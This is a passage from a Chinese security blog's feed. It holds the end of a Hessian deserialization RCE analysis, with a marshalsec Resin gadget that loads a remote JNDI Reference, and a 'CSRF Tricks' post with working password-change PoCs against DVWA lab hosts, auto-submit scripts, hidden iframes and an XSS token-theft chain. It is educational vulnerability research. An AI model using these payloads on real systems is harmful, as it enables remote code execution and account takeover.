Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">"javax.naming.spi.ContinuationDirContext"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        CannotProceedException cpe = <span class="keyword">new</span> CannotProceedException();</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"cause"</span>, <span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"stackTrace"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> Reference(<span class="string">"Foo"</span>, args[ <span class="number">1</span> ], args[ <span class="number">0</span> ]));</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"suppressedExceptions"</span>, <span class="keyword">null</span>);</span><br><span class="line">        DirContext ctx = (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> Hashtable&lt;&gt;());</span><br><span class="line">        QName qName = <span class="keyword">new</span> QName(ctx, <span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">        <span class="keyword">return</span> uf.makeToStringTriggerStable(qName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知：</p><ol><li>先定义了javax.naming.spi.ContinuationDirContext类实例，然后调用getDeclaredConstructor()函数生成CannotProceedException类和Hashtable类的结构体实例，用于构造后面的DirContext类实例并通过构造函数赋值给QName类实例的<code>_context</code>属性。</li><li>然后定义了一个CannotProceedException类变量cpe，该类用于程序出现异常时通过调用javax.naming.spi.NamingManager提供的方法（比如 getContinuationContext()）来查找另一个提供程序以继续操作；这里调用了setResolvedObj()函数设置此异常的已解析对象字段为恶意的Reference类实例，可以看到是Reference()的classFactoryLocation参数的JNDI注入利用，注意该Reference最后是传入到QName构造函数的第一个参数中。</li><li>接着，将设置好的cpe传入DirContext的newInstance()函数中新建实例。</li><li>最后定义了com.caucho.naming.QName这个类实例，再调用makeToStringTriggerStable()函数处理该对象并返回。</li></ol><p>接着跟踪makeToStringTriggerStable()函数的实现，根本是调用的ToStringUtil.makeToStringTrigger()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeToStringTrigger</span> <span class="params">( Object o )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String unhash = unhash(o.hashCode());</span><br><span class="line">    XString xString = <span class="keyword">new</span> XString(unhash);</span><br><span class="line">    <span class="keyword">return</span> JDKUtil.makeMap(o, xString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知，用到了com.sun.org.apache.xpath.internal.objects.XString这个类来和QName对象生成并返回一个Map对象。使用这个处理的目的是为了调用到QName.toString()函数。</p><p>最后我们看下com.caucho.naming.QName类的toString()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/15.png" alt=""></p><p>在toString()函数中，QName类的<code>_context</code>属性调用了composeName()函数。我们Gadget打进去后该属性类型为ContinuationDirContext，其中的cpe为CannotProceedException类实例，在调用到此处时会触发NamingException异常，此时会调用javax.naming.spi.NamingManager.getObjectFactoryFromReference()函数去加载Reference指定地址的服务，最后就是lookup()，从而导致RCE。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里使用IDEA对Tomcat的war包进行远程调试。</p><p>由于在Windows本地运行的Tomcat，因此打开Tomcat的配置文件catalina.bat添加如下配置再重启Tomcat即可开启远程调试的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555&quot;</span><br></pre></td></tr></table></figure><p>接着本地解压war包并用IDEA打开，然后使用Remote远程连接到Tomcat后，当显示”Connected to the target VM, address: ‘localhost:5555’, transport: ‘socket’”时表示成功，即可开始远程调试。</p><p>我们从配置文件web.xml开始看，这里有个URL的匹配路径/hessian，也就是刚刚我们访问的那个接口，可以看到其对应的是HessianServlet这个类：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/4.png" alt=""></p><p>跟进该类，直接在service()函数中下断点，然后浏览器再次访问<code>http://127.0.0.1:8080/HessianTest/hessian</code>页面即可停在断点处：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/5.png" alt=""></p><p>可以看到，这个接口需要POST方式来传数据，否则直接返回500。</p><p>重新发送payload，往下调试，看到会获取request请求中的输入流，然后调用invoke()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/6.png" alt=""></p><p>跟下去，在invoke()函数中会调用相关函数读取头类型，并在下面的switch语句中匹配符合条件的头类型进入不同的逻辑，这里获取到的头类型是<code>CALL_1_REPLY_2</code>，则调用createHessianInput()函数创建Hessian输入流和输出流：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/7.png" alt=""></p><p>接着会判断序列化器工厂是否为空，这里为非空则设置到Hessian的输入流和输出流，然后调用invoke()：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/8.png" alt=""></p><p>跟进去这个invoke()函数，这里循环遍历读入header头，若header存在则调用Hessian输入流的readObject()，这里读取到了python脚本构造的名为test的Hessian头：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/9.png" alt=""></p><p>跟进去HessianInput.readObject()函数中，其中先获取tag值为77即’M’，然后匹配到对应的switch语句中调用readMap()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/10.png" alt=""></p><p>跟进SerializerFactory.readMap()函数中，由于type为空且已经存在HashMap反序列化器，因此会调用MapDeserializer的readMap()函数继续解析序列化的Map内容：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/11.png" alt=""></p><p>跟进去MapDeserializer.readMap()函数，先新建一个HashMap实例，然后循环遍历HessianInput的内容，将其中的键值都进行readObject()操作然后再put进该新建的HashMap实例中：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/12.png" alt=""></p><p>这里readObject()处理过程也是一样的，简单地说就是获取序列化内容的类类型、属性值等（这里为反序列化获取com.caucho.naming.QName类及其属性值等，具体过程可自行调试下）。此处下断点然后F8过两次就能直接触发弹计算器了。</p><p>HashMap.put()函数中会调用hash(key)来计算对象的hash，然后再调用putVal()来设置HashMap的值：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/13.png" alt=""></p><p>这里hash(key)实际上就是调用的QName的hashCode()，在我本地调试的时候就出触发一次弹计算器（其实在获取了QName的<code>_items</code>属性后，只要在本地调试调用到QName的函数都会弹计算器，原因应该就是QName的<code>_context</code>属性中的cpe是个CannotProceedException类，会一直触发异常导致提前RCE）：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/14.png" alt=""></p><p>在第二次调用到HashMap.put()函数时，此时调用了XString的equals()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/19.png" alt=""></p><p>在XString.equals()函数中，调用了QName.toString()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/20.png" alt=""></p><p>调用到QName.toString()函数，这里才是真正的漏洞触发点，我们由前面知道marshalsec工具的Resin Gadget中QName类对象的<code>_context</code>属性的cpe是被设置为CannotProceedException类，该属性在调用composeName()函数时会捕获到NamingException异常，此时会调用javax.naming.spi.NamingManager的getContext()函数来查找另一个提供程序即恶意Reference来继续执行操作，从而触发RCE：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/21.png" alt=""></p><p>此时我们打开看下NamingException类实例即变量e中的stackTrace，验证了前面的分析，即QName.toString()中的漏洞点是在composeName()调用中，这里由于NamingException异常导致调用了NamingManager.getContext()来查找另一个程序继续执行，这其中有调用了NamingManager.getObjectFactoryFromReference()函数来加载payload中设置的恶意Reference地址指向的服务上的类，从而导致RCE：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/22.png" alt=""></p><p>此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">toString:346, QName (com.caucho.naming)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:573, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">invoke:240, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:198, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:425, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">service:405, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:52, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:678, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:609, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1623, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.freebuf.com/vuls/224280.html" target="_blank" rel="noopener">Hessian反序列化RCE漏洞复现及分析</a></p><p><a href="https://mp.weixin.qq.com/s/vW6IgaA_Imc7-_Bac9XNQg" target="_blank" rel="noopener">SOFA-Hessian反序列漏洞</a></p><p><a href="https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html" target="_blank" rel="noopener">Java Unmarshalling Security - 攻击Hessian协议</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks小结/</id>
    <published>2020-01-21T09:49:15.000Z</published>
    <updated>2020-01-25T00:49:14.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-废话"><a href="#0x00-废话" class="headerlink" title="0x00 废话"></a>0x00 废话</h2><p>这里对CSRF漏洞的攻击利用技巧做了笔记小结，不定时补充。</p><h2 id="0x01-CSRF并非必须点击才能攻击"><a href="#0x01-CSRF并非必须点击才能攻击" class="headerlink" title="0x01 CSRF并非必须点击才能攻击"></a>0x01 CSRF并非必须点击才能攻击</h2><p>常规的CSRF的PoC如下，以DVWA的为例，通常是新建一个a标签让受害者点击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而以BP生成的PoC则是用GET或POST的方式来提交表单，同样是需要受害者来点击提交的这个按钮才能触发CSRF攻击的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://172.26.224.239/DVWA/vulnerabilities/captcha/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实可以跳过用户点击按钮来触发CSRF攻击的这个步骤，只需要用户被诱使访问了恶意页面即可。当然，这种方法就是通过JavaScript来实现的。</p><p>a标签用的是click()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- JS实现自动点击 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">  m.click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>form表单用的是submit()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.132/dvwa/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- JS实现自动点击 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-利用iframe隐藏攻击过程"><a href="#0x02-利用iframe隐藏攻击过程" class="headerlink" title="0x02 利用iframe隐藏攻击过程"></a>0x02 利用iframe隐藏攻击过程</h2><p>一般的，CSRF攻击成功后就会自动跳转到已被CSRF攻击的目标页面中，此时容易被受害者发现。此时可以利用iframe标签来引入CSRF攻击页面，让CSRF攻击过程都不直接在页面中显现，一切都隐藏在页面中悄悄进行，不易被受害者发现。</p><p>隐藏iframe框可以使用HTML5的hidden属性或直接用iframe的height和width属性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"0"</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-CSRF并非必需浏览器才能攻击"><a href="#0x03-CSRF并非必需浏览器才能攻击" class="headerlink" title="0x03 CSRF并非必需浏览器才能攻击"></a>0x03 CSRF并非必需浏览器才能攻击</h2><p>一般针对Web服务的CSRF攻击，都是通过浏览器发起的，这是因为诱使受害者在浏览器中访问恶意页面时，浏览器会自动将已有的已登录站点的cookie自动带上去访问恶意页面中发起的表单请求。</p><p>但是CSRF并非只能通过浏览器这个媒介发起攻击的，它可利用自解压文件内的JavaScript等来攻击（当然，这是需要保存自本地的cookie才能成功）。</p><h2 id="0x04-GET型CSRF利用方式多样化"><a href="#0x04-GET型CSRF利用方式多样化" class="headerlink" title="0x04 GET型CSRF利用方式多样化"></a>0x04 GET型CSRF利用方式多样化</h2><p>我们稍微观察下BP生成的CSRF PoC会发现，无论是GET或POST都是表单的形式来发起攻击的。POST没话说，必须得是表单才能提交数据。但GET就不一定了，它可以通过其他的一些标签或属性来发起CSRF攻击。</p><p>可利用的方式如下：</p><ul><li><code>&lt;a&gt;</code>标签</li><li><code>&lt;img&gt;</code>标签</li><li><code>&lt;script&gt;</code>标签</li><li><code>&lt;iframe&gt;</code>标签</li><li><code>&lt;link&gt;</code>标签</li><li>CSS方法</li><li>JavaScript方法：Image对象、XMLHTTP对象</li></ul><p>如前面BP生成的GET型CSRF攻击表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://172.26.224.239/DVWA/vulnerabilities/captcha/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a标签，如前面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>img标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>iframe标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span> /&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>link标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过CSS触发：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#'</span>);&#125;</span><br></pre></td></tr></table></figure><p>当然要通过标签引入该CSS文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"csrf.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-CSRF-XSS漏洞组合拳"><a href="#0x05-CSRF-XSS漏洞组合拳" class="headerlink" title="0x05 CSRF+XSS漏洞组合拳"></a>0x05 CSRF+XSS漏洞组合拳</h2><h3 id="CSRF-XSS"><a href="#CSRF-XSS" class="headerlink" title="CSRF+XSS"></a>CSRF+XSS</h3><p>这是最常见的前端漏洞组合拳。通常用于对漏洞的深度利用，或者是对防御的一种绕过利用，比如站点对CSRF漏洞设置了token机制来进行防御、但站点存在XSS漏洞可窃取CSRF token导致CSRF防御形同虚设，又如站点设置了HttpOnly限制XSS不能窃取用户cookie信息、但站点存在CSRF漏洞可被利用来进行其他的一些恶意表单操作。</p><blockquote><p>生成一个随机Token是防御CSRF的经典方法之一。在页面涉及到表单时，会在服务器端生成一个Token，在页面加载时创建一个值为Token的<code>input</code>，插入到表单中，并设置<code>type=”hidden“</code>隐藏。当提交表单时，会将这个Token值一起提交。服务器端验证这个Token是否正确，如果不正确就会扔掉此次请求。本来只要获取目标页面Token的值，这种防御方法就会无效。<strong>但CSRF攻击是在其他网站发起的，由于同源策略，发起攻击的网站B不能读取被攻击的网站A的内容，只能够对其发送请求。因此攻击者是无法获取Token值的，CSRF攻击就此失效。</strong>但当目标网站有一个XSS漏洞时，我们便可以先发送一次请求，通过JS的跨域方法绕过同源策略，从而读取网站A页面中的Token值。再发送第二次请求，带上Token值，完成CSRF攻击。博主这里使用<code>window.name</code>来跨域窃取Token值。假如发起攻击的网站为B，受害站点为A。</p><p>1.在A网站的URL中构造XSS payload，实现以下功能：</p><ul><li>获取本页面的Token值</li><li>将Token值赋值给<code>window.name</code></li></ul><p>2.在B网站中插入实现以下功能的JS：</p><ul><li><p>创建一个<code>iframe</code>，并将<code>iframe.src</code>设为上面构造好的带有XSS payload的A网站的URL</p></li><li><p>写一个<code>function</code>，首先将<code>iframe.contentWindow.location</code>设为任意一个与B网站同源的页面，然后使<code>window.name = iframe.contentWindow.name</code></p><p>修改<code>iframe.contentWindow.location</code>的原因是：当<code>iframe</code>中的页面为A网站的页面时，与B网站为不同源的，不能将<code>iframe</code>的<code>window.name</code>赋值给当前B网站窗口的<code>window.name</code>。但是我们把<code>iframe</code>中的页面换为与B网站同源的页面时，是可以进行<code>window.name</code>的赋值的。由于<code>window.name</code>的特性，其值本身与网站无关，是窗口的一个值。因此修改页面后<code>window.name</code>并未改变，我们就可以顺利取出了。</p></li><li><p>将这个<code>iframe</code>销毁</p></li></ul><p>3.在B网站中插入真正的CSRF payload，带上已成功获取的<code>window.name</code>中的Token值，进行攻击。</p></blockquote><p>案例：<a href="https://www.cnblogs.com/xishaonian/p/6557769.html" target="_blank" rel="noopener">一次csrf配合xss的攻击实例</a></p><p>下面简单举例DVWA中XSS与CSRF漏洞的组合利用。</p><p>我们知道DVWA的CSRF的low级是无验证原密码就修改密码的，提交的是GET表单请求，payload如下：</p><figure class="highlight plain"><table><tr><td 